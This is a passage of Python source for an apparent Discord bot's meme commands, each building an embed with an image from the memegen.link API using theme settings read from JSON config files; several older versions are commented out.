    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)


    
    # @React.command()
    # async def drake(ctx, text1: str, *, text2: str):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Drake',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.alexflipnote.dev/drake?top={urllib.parse.quote(text1)}&bottom={urllib.parse.quote(text2)}')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def drake(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Drake',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/drake/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)


    
    # @React.command()
    # async def fry(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Fry',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/fry/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def bihw(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'But it\'s honest work',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/bihw/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def cheems(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cheems',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/cheems/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def fwp(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'First World Problems',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/fwp/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def mb(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Member Berries',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/mb/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def mordor(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mordor',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/mordor/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def morpheus(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Morpheus',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/morpheus/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def pigeon(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Is this a pigeon?',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/pigeon/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def spiderman(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Spiderman pointing at Spiderman',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/spiderman/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def spongemock(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mocking Spongebob',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/spongebob/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def ds(ctx, text1: str="", text2: str=""):
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Daily Struggle',timestamp=embed_timestamp())
    #     embed.set_image(url=f'https://api.memegen.link/images/ds/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png')
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)


    # Experimental Code Generation

    @React.command(usage="aag <Text 1> <Text 2>", description="Ancient Aliens Guy")
    async def aag(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Ancient Aliens Guy""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/aag/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ackbar <Text 1> <Text 2>", description="It's A Trap!")
    async def ackbar(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""It's A Trap!""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ackbar/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="afraid <Text 1> <Text 2>", description="Afraid to Ask Andy")
    async def afraid(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Afraid to Ask Andy""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/afraid/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="agnes <Text 1> <Text 2>", description="Agnes Harkness Winking")
    async def agnes(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Agnes Harkness Winking""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/agnes/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="aintgottime <Text 1> <Text 2>", description="Sweet Brown / Ain't Nobody Got Time For That")
    async def aintgottime(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sweet Brown / Ain't Nobody Got Time For That""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/aint-got-time/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ams <Text 1> <Text 2>", description="Awkward Moment Seal")
    async def ams(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Awkward Moment Seal""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ams/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ants <Text 1> <Text 2>", description="Do You Want Ants?")
    async def ants(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Do You Want Ants?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ants/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="apcr <Text 1> <Text 2>", description="Almost Politically Correct Redneck")
    async def apcr(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Almost Politically Correct Redneck""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/apcr/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="atis <Text 1> <Text 2>", description="And Then I Said")
    async def atis(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""And Then I Said""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/atis/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="away <Text 1> <Text 2>", description="Life... Finds a Way")
    async def away(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Life... Finds a Way""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/away/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
